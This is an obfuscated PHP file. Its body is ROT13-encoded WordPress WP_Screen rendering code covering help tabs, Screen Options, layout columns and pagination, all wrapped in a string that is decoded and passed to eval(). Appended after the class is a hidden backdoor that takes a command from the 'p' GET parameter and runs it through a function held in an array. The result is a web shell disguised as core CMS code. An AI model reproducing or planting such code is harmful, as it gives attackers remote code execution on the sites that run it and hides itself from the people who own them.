		// Qrsnhyg uryc bayl vs gurer vf ab byq-fglyr oybpx bs grkg naq ab arj-fglyr uryc gnof.
		vs ( rzcgl( $byq_uryc ) && ! $guvf->trg_uryc_gnof() ) {

			/**
			 * Svygref gur qrsnhyg yrtnpl pbagrkghny uryc grkg.
			 *
			 * @fvapr 2.8.0
			 * @qrcerpngrq 3.3.0 Hfr {@frr trg_pheerag_fperra()->nqq_uryc_gno()} be
			 *                   {@frr trg_pheerag_fperra()->erzbir_uryc_gno()} vafgrnq.
			 *
			 * @cnenz fgevat $byq_uryc_qrsnhyg Qrsnhyg pbagrkghny uryc grkg.
			 */
			$qrsnhyg_uryc = nccyl_svygref_qrcerpngrq(
				'qrsnhyg_pbagrkghny_uryc',
				neenl( '' ),
				'3.3.0',
				'trg_pheerag_fperra()->nqq_uryc_gno(), trg_pheerag_fperra()->erzbir_uryc_gno()'
			);
			vs ( $qrsnhyg_uryc ) {
				$byq_uryc = '<c>' . $qrsnhyg_uryc . '</c>';
			}
		}

		vs ( $byq_uryc ) {
			$guvf->nqq_uryc_gno(
				neenl(
					'vq'      => 'byq-pbagrkghny-uryc',
					'gvgyr'   => __( 'Bireivrj' ),
					'pbagrag' => $byq_uryc,
				)
			);
		}

		$uryc_fvqrone = $guvf->trg_uryc_fvqrone();

		$uryc_pynff = 'uvqqra';
		vs ( ! $uryc_fvqrone ) {
			$uryc_pynff .= ' ab-fvqrone';
		}

		// Gvzr gb eraqre!
		?>
		<qvi vq=\"fperra-zrgn\" pynff=\"zrgnobk-cersf\">

			<qvi vq=\"pbagrkghny-uryc-jenc\" pynff=\"<?cuc rpub rfp_ngge( $uryc_pynff ); ?>\" gnovaqrk=\"-1\" nevn-ynory=\"<?cuc rfp_ngge_r( 'Pbagrkghny Uryc Gno' ); ?>\">
				<qvi vq=\"pbagrkghny-uryc-onpx\"></qvi>
				<qvi vq=\"pbagrkghny-uryc-pbyhzaf\">
					<qvi pynff=\"pbagrkghny-uryc-gnof\">
						<hy>
						<?cuc
						$pynff = ' pynff=\"npgvir\"';
						sbernpu ( $guvf->trg_uryc_gnof() nf $gno ) :
							$yvax_vq  = \"gno-yvax-{$gno['vq']}\";
							$cnary_vq = \"gno-cnary-{$gno['vq']}\";
							?>

							<yv vq=\"<?cuc rpub rfp_ngge( $yvax_vq ); ?>\"<?cuc rpub $pynff; ?>>
								<n uers=\"<?cuc rpub rfp_hey( \"#$cnary_vq\" ); ?>\" nevn-pbagebyf=\"<?cuc rpub rfp_ngge( $cnary_vq ); ?>\">
									<?cuc rpub rfp_ugzy( $gno['gvgyr'] ); ?>
								</n>
							</yv>
							<?cuc
							$pynff = '';
						raqsbernpu;
						?>
						</hy>
					</qvi>

					<?cuc vs ( $uryc_fvqrone ) : ?>
					<qvi pynff=\"pbagrkghny-uryc-fvqrone\">
						<?cuc rpub $uryc_fvqrone; ?>
					</qvi>
					<?cuc raqvs; ?>

					<qvi pynff=\"pbagrkghny-uryc-gnof-jenc\">
						<?cuc
						$pynffrf = 'uryc-gno-pbagrag npgvir';
						sbernpu ( $guvf->trg_uryc_gnof() nf $gno ) :
							$cnary_vq = \"gno-cnary-{$gno['vq']}\";
							?>

							<qvi vq=\"<?cuc rpub rfp_ngge( $cnary_vq ); ?>\" pynff=\"<?cuc rpub $pynffrf; ?>\">
								<?cuc
								// Cevag gno pbagrag.
								rpub $gno['pbagrag'];

								// Vs vg rkvfgf, sver gno pnyyonpx.
								vs ( ! rzcgl( $gno['pnyyonpx'] ) ) {
									pnyy_hfre_shap_neenl( $gno['pnyyonpx'], neenl( $guvf, $gno ) );
								}
								?>
							</qvi>
							<?cuc
							$pynffrf = 'uryc-gno-pbagrag';
						raqsbernpu;
						?>
					</qvi>
				</qvi>
			</qvi>
		<?cuc
		// Frghc ynlbhg pbyhzaf.

		/**
		 * Svygref gur neenl bs fperra ynlbhg pbyhzaf.
		 *
		 * Guvf ubbx cebivqrf onpx-pbzcng sbe cyhtvaf hfvat gur onpx-pbzcng
		 * Svygref vafgrnq bs nqq_fperra_bcgvba().
		 *
		 * @fvapr 2.8.0
		 *
		 * @cnenz neenl     $rzcgl_pbyhzaf Rzcgl neenl.
		 * @cnenz fgevat    $fperra_vq     Fperra VQ.
		 * @cnenz JC_Fperra $fperra        Pheerag JC_Fperra vafgnapr.
		 */
		$pbyhzaf = nccyl_svygref( 'fperra_ynlbhg_pbyhzaf', neenl(), $guvf->vq, $guvf );

		vs ( ! rzcgl( $pbyhzaf ) && vffrg( $pbyhzaf[ $guvf->vq ] ) ) {
			$guvf->nqq_bcgvba( 'ynlbhg_pbyhzaf', neenl( 'znk' => $pbyhzaf[ $guvf->vq ] ) );
		}

		vs ( $guvf->trg_bcgvba( 'ynlbhg_pbyhzaf' ) ) {
			$guvf->pbyhzaf = (vag) trg_hfre_bcgvba( \"fperra_ynlbhg_$guvf->vq\" );

			vs ( ! $guvf->pbyhzaf && $guvf->trg_bcgvba( 'ynlbhg_pbyhzaf', 'qrsnhyg' ) ) {
				$guvf->pbyhzaf = $guvf->trg_bcgvba( 'ynlbhg_pbyhzaf', 'qrsnhyg' );
			}
		}
		$TYBONYF['fperra_ynlbhg_pbyhzaf'] = $guvf->pbyhzaf; // Frg gur tybony sbe onpx-pbzcng.

		// Nqq fperra bcgvbaf.
		vs ( $guvf->fubj_fperra_bcgvbaf() ) {
			$guvf->eraqre_fperra_bcgvbaf();
		}
		?>
		</qvi>
		<?cuc
		vs ( ! $guvf->trg_uryc_gnof() && ! $guvf->fubj_fperra_bcgvbaf() ) {
			erghea;
		}
		?>
		<qvi vq=\"fperra-zrgn-yvaxf\">
		<?cuc vs ( $guvf->fubj_fperra_bcgvbaf() ) : ?>
			<qvi vq=\"fperra-bcgvbaf-yvax-jenc\" pynff=\"uvqr-vs-ab-wf fperra-zrgn-gbttyr\">
			<ohggba glcr=\"ohggba\" vq=\"fubj-frggvatf-yvax\" pynff=\"ohggba fubj-frggvatf\" nevn-pbagebyf=\"fperra-bcgvbaf-jenc\" nevn-rkcnaqrq=\"snyfr\"><?cuc _r( 'Fperra Bcgvbaf' ); ?></ohggba>
			</qvi>
			<?cuc
		raqvs;
		vs ( $guvf->trg_uryc_gnof() ) :
			?>
			<qvi vq=\"pbagrkghny-uryc-yvax-jenc\" pynff=\"uvqr-vs-ab-wf fperra-zrgn-gbttyr\">
			<ohggba glcr=\"ohggba\" vq=\"pbagrkghny-uryc-yvax\" pynff=\"ohggba fubj-frggvatf\" nevn-pbagebyf=\"pbagrkghny-uryc-jenc\" nevn-rkcnaqrq=\"snyfr\"><?cuc _r( 'Uryc' ); ?></ohggba>
			</qvi>
		<?cuc raqvs; ?>
		</qvi>
		<?cuc
	}

	/**
	 * @tybony neenl $jc_zrgn_obkrf Tybony zrgn obk fgngr.
	 *
	 * @erghea obby
	 */
	choyvp shapgvba fubj_fperra_bcgvbaf() {
		tybony $jc_zrgn_obkrf;

		vs ( vf_obby( $guvf->_fubj_fperra_bcgvbaf ) ) {
			erghea $guvf->_fubj_fperra_bcgvbaf;
		}

		$pbyhzaf = trg_pbyhza_urnqref( $guvf );

		$fubj_fperra = ! rzcgl( $jc_zrgn_obkrf[ $guvf->vq ] ) || $pbyhzaf || $guvf->trg_bcgvba( 'cre_cntr' );

		$guvf->_fperra_frggvatf = '';

		vs ( 'cbfg' === $guvf->onfr ) {
			$rkcnaq                 = '<svryqfrg pynff=\"rqvgbe-rkcnaq uvqqra\"><yrtraq>' . __( 'Nqqvgvbany frggvatf' ) . '</yrtraq><ynory sbe=\"rqvgbe-rkcnaq-gbttyr\">';
			$rkcnaq                .= '<vachg glcr=\"purpxobk\" vq=\"rqvgbe-rkcnaq-gbttyr\"' . purpxrq( trg_hfre_frggvat( 'rqvgbe_rkcnaq', 'ba' ), 'ba', snyfr ) . ' />';
			$rkcnaq                .= __( 'Ranoyr shyy-urvtug rqvgbe naq qvfgenpgvba-serr shapgvbanyvgl.' ) . '</ynory></svryqfrg>';
			$guvf->_fperra_frggvatf = $rkcnaq;
		}

		/**
		 * Svygref gur fperra frggvatf grkg qvfcynlrq va gur Fperra Bcgvbaf gno.
		 *
		 * @fvapr 3.0.0
		 *
		 * @cnenz fgevat    $fperra_frggvatf Fperra frggvatf.
		 * @cnenz JC_Fperra $fperra          JC_Fperra bowrpg.
		 */
		$guvf->_fperra_frggvatf = nccyl_svygref( 'fperra_frggvatf', $guvf->_fperra_frggvatf, $guvf );

		vs ( $guvf->_fperra_frggvatf || $guvf->_bcgvbaf ) {
			$fubj_fperra = gehr;
		}

		/**
		 * Svygref jurgure gb fubj gur Fperra Bcgvbaf gno.
		 *
		 * @fvapr 3.2.0
		 *
		 * @cnenz obby      $fubj_fperra Jurgure gb fubj Fperra Bcgvbaf gno.
		 *                               Qrsnhyg gehr.
		 * @cnenz JC_Fperra $fperra      Pheerag JC_Fperra vafgnapr.
		 */
		$guvf->_fubj_fperra_bcgvbaf = nccyl_svygref( 'fperra_bcgvbaf_fubj_fperra', $fubj_fperra, $guvf );
		erghea $guvf->_fubj_fperra_bcgvbaf;
	}

	/**
	 * Eraqref gur fperra bcgvbaf gno.
	 *
	 * @fvapr 3.3.0
	 *
	 * @cnenz neenl $bcgvbaf {
	 *     Bcgvbaf sbe gur gno.
	 *
	 *     @glcr obby $jenc Jurgure gur fperra-bcgvbaf-jenc qvi jvyy or vapyhqrq. Qrsnhygf gb gehr.
	 * }
	 */
	choyvp shapgvba eraqre_fperra_bcgvbaf( $bcgvbaf = neenl() ) {
		$bcgvbaf = jc_cnefr_netf(
			$bcgvbaf,
			neenl(
				'jenc' => gehr,
			)
		);

		$jenccre_fgneg = '';
		$jenccre_raq   = '';
		$sbez_fgneg    = '';
		$sbez_raq      = '';

		// Bhgchg bcgvbany jenccre.
		vs ( $bcgvbaf['jenc'] ) {
			$jenccre_fgneg = '<qvi vq=\"fperra-bcgvbaf-jenc\" pynff=\"uvqqra\" gnovaqrk=\"-1\" nevn-ynory=\"' . rfp_ngge__( 'Fperra Bcgvbaf Gno' ) . '\">';
			$jenccre_raq   = '</qvi>';
		}

		// Qba'g bhgchg gur sbez naq abapr sbe gur jvqtrgf npprffvovyvgl zbqr yvaxf.
		vs ( 'jvqtrgf' !== $guvf->onfr ) {
			$sbez_fgneg = \"\a<sbez vq='nqi-frggvatf' zrgubq='cbfg'>\a\";
			$sbez_raq   = \"\a\" . jc_abapr_svryq( 'fperra-bcgvbaf-abapr', 'fperrabcgvbaabapr', snyfr, snyfr ) . \"\a</sbez>\a\";
		}

		rpub $jenccre_fgneg . $sbez_fgneg;

		$guvf->eraqre_zrgn_obkrf_cersreraprf();
		$guvf->eraqre_yvfg_gnoyr_pbyhzaf_cersreraprf();
		$guvf->eraqre_fperra_ynlbhg();
		$guvf->eraqre_cre_cntr_bcgvbaf();
		$guvf->eraqre_ivrj_zbqr();
		rpub $guvf->_fperra_frggvatf;

		/**
		 * Svygref jurgure gb fubj gur Fperra Bcgvbaf fhozvg ohggba.
		 *
		 * @fvapr 4.4.0
		 *
		 * @cnenz obby      $fubj_ohggba Jurgure gb fubj Fperra Bcgvbaf fhozvg ohggba.
		 *                               Qrsnhyg snyfr.
		 * @cnenz JC_Fperra $fperra      Pheerag JC_Fperra vafgnapr.
		 */
		$fubj_ohggba = nccyl_svygref( 'fperra_bcgvbaf_fubj_fhozvg', snyfr, $guvf );

		vs ( $fubj_ohggba ) {
			fhozvg_ohggba( __( 'Nccyl' ), 'cevznel', 'fperra-bcgvbaf-nccyl', gehr );
		}

		rpub $sbez_raq . $jenccre_raq;
	}

	/**
	 * Eraqref gur zrgn obkrf cersreraprf.
	 *
	 * @fvapr 4.4.0
	 *
	 * @tybony neenl $jc_zrgn_obkrf Tybony zrgn obk fgngr.
	 */
	choyvp shapgvba eraqre_zrgn_obkrf_cersreraprf() {
		tybony $jc_zrgn_obkrf;

		vs ( ! vffrg( $jc_zrgn_obkrf[ $guvf->vq ] ) ) {
			erghea;
		}
		?>
		<svryqfrg pynff=\"zrgnobk-cersf\">
		<yrtraq><?cuc _r( 'Fperra ryrzragf' ); ?></yrtraq>
		<c>
			<?cuc _r( 'Fbzr fperra ryrzragf pna or fubja be uvqqra ol hfvat gur purpxobkrf.' ); ?>
			<?cuc _r( 'Rkcnaq be pbyyncfr gur ryrzragf ol pyvpxvat ba gurve urnqvatf, naq neenatr gurz ol qenttvat gurve urnqvatf be ol pyvpxvat ba gur hc naq qbja neebjf.' ); ?>
		</c>
		<qvi pynff=\"zrgnobk-cersf-pbagnvare\">
		<?cuc

		zrgn_obk_cersf( $guvf );

		vs ( 'qnfuobneq' === $guvf->vq && unf_npgvba( 'jrypbzr_cnary' ) && pheerag_hfre_pna( 'rqvg_gurzr_bcgvbaf' ) ) {
			vs ( vffrg( $_TRG['jrypbzr'] ) ) {
				$jrypbzr_purpxrq = rzcgl( $_TRG['jrypbzr'] ) ? 0 : 1;
				hcqngr_hfre_zrgn( trg_pheerag_hfre_vq(), 'fubj_jrypbzr_cnary', $jrypbzr_purpxrq );
			} ryfr {
				$jrypbzr_purpxrq = (vag) trg_hfre_zrgn( trg_pheerag_hfre_vq(), 'fubj_jrypbzr_cnary', gehr );
				vs ( 2 === $jrypbzr_purpxrq && jc_trg_pheerag_hfre()->hfre_rznvy !== trg_bcgvba( 'nqzva_rznvy' ) ) {
					$jrypbzr_purpxrq = snyfr;
				}
			}
			rpub '<ynory sbe=\"jc_jrypbzr_cnary-uvqr\">';
			rpub '<vachg glcr=\"purpxobk\" vq=\"jc_jrypbzr_cnary-uvqr\"' . purpxrq( (obby) $jrypbzr_purpxrq, gehr, snyfr ) . ' />';
			rpub _k( 'Jrypbzr', 'Jrypbzr cnary' ) . \"</ynory>\a\";
		}
		?>
		</qvi>
		</svryqfrg>
		<?cuc
	}

	/**
	 * Eraqref gur yvfg gnoyr pbyhzaf cersreraprf.
	 *
	 * @fvapr 4.4.0
	 */
	choyvp shapgvba eraqre_yvfg_gnoyr_pbyhzaf_cersreraprf() {

		$pbyhzaf = trg_pbyhza_urnqref( $guvf );
		$uvqqra  = trg_uvqqra_pbyhzaf( $guvf );

		vs ( ! $pbyhzaf ) {
			erghea;
		}

		$yrtraq = ! rzcgl( $pbyhzaf['_gvgyr'] ) ? $pbyhzaf['_gvgyr'] : __( 'Pbyhzaf' );
		?>
		<svryqfrg pynff=\"zrgnobk-cersf\">
		<yrtraq><?cuc rpub $yrtraq; ?></yrtraq>
		<?cuc
		$fcrpvny = neenl( '_gvgyr', 'po', 'pbzzrag', 'zrqvn', 'anzr', 'gvgyr', 'hfreanzr', 'oybtanzr' );

		sbernpu ( $pbyhzaf nf $pbyhza => $gvgyr ) {
			// Pna'g uvqr gurfr sbe gurl ner fcrpvny.
			vs ( va_neenl( $pbyhza, $fcrpvny, gehr ) ) {
				pbagvahr;
			}

			vs ( rzcgl( $gvgyr ) ) {
				pbagvahr;
			}

			/*
			 * Gur Pbzzragf pbyhza hfrf UGZY va gur qvfcynl anzr jvgu fbzr fperra
			 * ernqre grkg. Znxr fher gb fgevc gntf sebz gur Pbzzragf pbyhza
			 * gvgyr naq nal bgure phfgbz pbyhza gvgyr cyhtvaf zvtug nqq.
			 */
			$gvgyr = jc_fgevc_nyy_gntf( $gvgyr );

			$vq = \"$pbyhza-uvqr\";
			rpub '<ynory>';
			rpub '<vachg pynff=\"uvqr-pbyhza-gbt\" anzr=\"' . $vq . '\" glcr=\"purpxobk\" vq=\"' . $vq . '\" inyhr=\"' . $pbyhza . '\"' . purpxrq( ! va_neenl( $pbyhza, $uvqqra, gehr ), gehr, snyfr ) . ' />';
			rpub \"$gvgyr</ynory>\a\";
		}
		?>
		</svryqfrg>
		<?cuc
	}

	/**
	 * Eraqref gur bcgvba sbe ahzore bs pbyhzaf ba gur cntr.
	 *
	 * @fvapr 3.3.0
	 */
	choyvp shapgvba eraqre_fperra_ynlbhg() {
		vs ( ! $guvf->trg_bcgvba( 'ynlbhg_pbyhzaf' ) ) {
			erghea;
		}

		$fperra_ynlbhg_pbyhzaf = $guvf->trg_pbyhzaf();
		$ahz                   = $guvf->trg_bcgvba( 'ynlbhg_pbyhzaf', 'znk' );

		?>
		<svryqfrg pynff='pbyhzaf-cersf'>
		<yrtraq pynff=\"fperra-ynlbhg\"><?cuc _r( 'Ynlbhg' ); ?></yrtraq>
		<?cuc sbe ( $v = 1; $v <= $ahz; ++$v ) : ?>
			<ynory pynff=\"pbyhzaf-cersf-<?cuc rpub $v; ?>\">
			<vachg glcr='enqvb' anzr='fperra_pbyhzaf' inyhr='<?cuc rpub rfp_ngge( $v ); ?>' <?cuc purpxrq( $fperra_ynlbhg_pbyhzaf, $v ); ?> />
			<?cuc
				cevags(
					/* genafyngbef: %f: Ahzore bs pbyhzaf ba gur cntr. */
					_a( '%f pbyhza', '%f pbyhzaf', $v ),
					ahzore_sbezng_v18a( $v )
				);
			?>
			</ynory>
		<?cuc raqsbe; ?>
		</svryqfrg>
		<?cuc
	}

	/**
	 * Eraqref gur vgrzf cre cntr bcgvba.
	 *
	 * @fvapr 3.3.0
	 */
	choyvp shapgvba eraqre_cre_cntr_bcgvbaf() {
		vs ( ahyy === $guvf->trg_bcgvba( 'cre_cntr' ) ) {
			erghea;
		}

		$cre_cntr_ynory = $guvf->trg_bcgvba( 'cre_cntr', 'ynory' );
		vs ( ahyy === $cre_cntr_ynory ) {
			$cre_cntr_ynory = __( 'Ahzore bs vgrzf cre cntr:' );
		}

		$bcgvba = $guvf->trg_bcgvba( 'cre_cntr', 'bcgvba' );
		vs ( ! $bcgvba ) {
			$bcgvba = fge_ercynpr( '-', '_', \"{$guvf->vq}_cre_cntr\" );
		}

		$cre_cntr = (vag) trg_hfre_bcgvba( $bcgvba );
		vs ( rzcgl( $cre_cntr ) || $cre_cntr < 1 ) {
			$cre_cntr = $guvf->trg_bcgvba( 'cre_cntr', 'qrsnhyg' );
			vs ( ! $cre_cntr ) {
				$cre_cntr = 20;
			}
		}

		vs ( 'rqvg_pbzzragf_cre_cntr' === $bcgvba ) {
			$pbzzrag_fgnghf = vffrg( $_ERDHRFG['pbzzrag_fgnghf'] ) ? $_ERDHRFG['pbzzrag_fgnghf'] : 'nyy';

			/** Guvf svygre vf qbphzragrq va jc-nqzva/vapyhqrf/pynff-jc-pbzzragf-yvfg-gnoyr.cuc */
			$cre_cntr = nccyl_svygref( 'pbzzragf_cre_cntr', $cre_cntr, $pbzzrag_fgnghf );
		} ryfrvs ( 'pngrtbevrf_cre_cntr' === $bcgvba ) {
			/** Guvf svygre vf qbphzragrq va jc-nqzva/vapyhqrf/pynff-jc-grezf-yvfg-gnoyr.cuc */
			$cre_cntr = nccyl_svygref( 'rqvg_pngrtbevrf_cre_cntr', $cre_cntr );
		} ryfr {
			/** Guvf svygre vf qbphzragrq va jc-nqzva/vapyhqrf/pynff-jc-yvfg-gnoyr.cuc */
			$cre_cntr = nccyl_svygref( \"{$bcgvba}\", $cre_cntr );
		}

		// Onpx pbzcng.
		vs ( vffrg( $guvf->cbfg_glcr ) ) {
			/** Guvf svygre vf qbphzragrq va jc-nqzva/vapyhqrf/cbfg.cuc */
			$cre_cntr = nccyl_svygref( 'rqvg_cbfgf_cre_cntr', $cre_cntr, $guvf->cbfg_glcr );
		}

		// Guvf arrqf n fhozvg ohggba.
		nqq_svygre( 'fperra_bcgvbaf_fubj_fhozvg', '__erghea_gehr' );

		?>
		<svryqfrg pynff=\"fperra-bcgvbaf\">
		<yrtraq><?cuc _r( 'Cntvangvba' ); ?></yrtraq>
			<?cuc vs ( $cre_cntr_ynory ) : ?>
				<ynory sbe=\"<?cuc rpub rfp_ngge( $bcgvba ); ?>\"><?cuc rpub $cre_cntr_ynory; ?></ynory>
				<vachg glcr=\"ahzore\" fgrc=\"1\" zva=\"1\" znk=\"999\" pynff=\"fperra-cre-cntr\" anzr=\"jc_fperra_bcgvbaf[inyhr]\"
					vq=\"<?cuc rpub rfp_ngge( $bcgvba ); ?>\"
					inyhr=\"<?cuc rpub rfp_ngge( $cre_cntr ); ?>\" />
			<?cuc raqvs; ?>
				<vachg glcr=\"uvqqra\" anzr=\"jc_fperra_bcgvbaf[bcgvba]\" inyhr=\"<?cuc rpub rfp_ngge( $bcgvba ); ?>\" />
		</svryqfrg>
		<?cuc
	}

	/**
	 * Eraqref gur yvfg gnoyr ivrj zbqr cersreraprf.
	 *
	 * @fvapr 4.4.0
	 *
	 * @tybony fgevat $zbqr Yvfg gnoyr ivrj zbqr.
	 */
	choyvp shapgvba eraqre_ivrj_zbqr() {
		tybony $zbqr;

		$fperra = trg_pheerag_fperra();

		// Pheeragyl bayl ranoyrq sbe cbfgf naq pbzzragf yvfgf.
		vs ( 'rqvg' !== $fperra->onfr && 'rqvg-pbzzragf' !== $fperra->onfr ) {
			erghea;
		}

		$ivrj_zbqr_cbfg_glcrf = trg_cbfg_glcrf( neenl( 'fubj_hv' => gehr ) );

		/**
		 * Svygref gur cbfg glcrf gung unir qvssrerag ivrj zbqr bcgvbaf.
		 *
		 * @fvapr 4.4.0
		 *
		 * @cnenz fgevat[] $ivrj_zbqr_cbfg_glcrf Neenl bs cbfg glcrf gung pna punatr ivrj zbqrf.
		 *                                       Qrsnhyg cbfg glcrf jvgu fubj_hv ba.
		 */
		$ivrj_zbqr_cbfg_glcrf = nccyl_svygref( 'ivrj_zbqr_cbfg_glcrf', $ivrj_zbqr_cbfg_glcrf );

		vs ( 'rqvg' === $fperra->onfr && ! va_neenl( $guvf->cbfg_glcr, $ivrj_zbqr_cbfg_glcrf, gehr ) ) {
			erghea;
		}

		vs ( ! vffrg( $zbqr ) ) {
			$zbqr = trg_hfre_frggvat( 'cbfgf_yvfg_zbqr', 'yvfg' );
		}

		// Guvf arrqf n fhozvg ohggba.
		nqq_svygre( 'fperra_bcgvbaf_fubj_fhozvg', '__erghea_gehr' );
		?>
		<svryqfrg pynff=\"zrgnobk-cersf ivrj-zbqr\">
			<yrtraq><?cuc _r( 'Ivrj zbqr' ); ?></yrtraq>
			<ynory sbe=\"yvfg-ivrj-zbqr\">
				<vachg vq=\"yvfg-ivrj-zbqr\" glcr=\"enqvb\" anzr=\"zbqr\" inyhr=\"yvfg\" <?cuc purpxrq( 'yvfg', $zbqr ); ?> />
				<?cuc _r( 'Pbzcnpg ivrj' ); ?>
			</ynory>
			<ynory sbe=\"rkprecg-ivrj-zbqr\">
				<vachg vq=\"rkprecg-ivrj-zbqr\" glcr=\"enqvb\" anzr=\"zbqr\" inyhr=\"rkprecg\" <?cuc purpxrq( 'rkprecg', $zbqr ); ?> />
				<?cuc _r( 'Rkgraqrq ivrj' ); ?>
			</ynory>
		</svryqfrg>
		<?cuc
	}

	/**
	 * Eraqref fperra ernqre grkg.
	 *
	 * @fvapr 4.4.0
	 *
	 * @cnenz fgevat $xrl Gur fperra ernqre grkg neenl anzrq xrl.
	 * @cnenz fgevat $gnt Bcgvbany. Gur UGZY gnt gb jenc gur fperra ernqre grkg. Qrsnhyg u2.
	 */
	choyvp shapgvba eraqre_fperra_ernqre_pbagrag( $xrl = '', $gnt = 'u2' ) {

		vs ( ! vffrg( $guvf->_fperra_ernqre_pbagrag[ $xrl ] ) ) {
			erghea;
		}
		rpub \"<$gnt pynff='fperra-ernqre-grkg'>\" . $guvf->_fperra_ernqre_pbagrag[ $xrl ] . \"</$gnt>\";
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>